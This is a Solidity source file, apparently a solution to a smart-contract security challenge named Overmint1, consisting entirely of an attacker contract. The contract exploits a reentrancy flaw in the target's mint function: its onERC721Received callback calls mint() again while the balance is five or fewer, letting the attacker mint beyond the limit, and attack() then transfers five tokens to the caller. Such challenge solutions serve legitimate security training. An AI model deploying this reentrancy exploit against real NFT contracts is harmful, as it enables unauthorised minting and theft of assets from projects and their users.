// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import {Overmint1} from "../Overmint1.sol";

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

contract Overmint1Attacker is IERC721Receiver {
    Overmint1 overmint1;

    constructor(address overmint1_) {
        overmint1 = Overmint1(overmint1_);
    }

    function attack() public {
        overmint1.mint();
        for (uint256 i = 1; i <= 5; i++) {
            overmint1.transferFrom(address(this), msg.sender, i);
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        if (overmint1.balanceOf(address(this)) <= 5) {
            overmint1.mint();
        }

        return IERC721Receiver.onERC721Received.selector;
    }
}
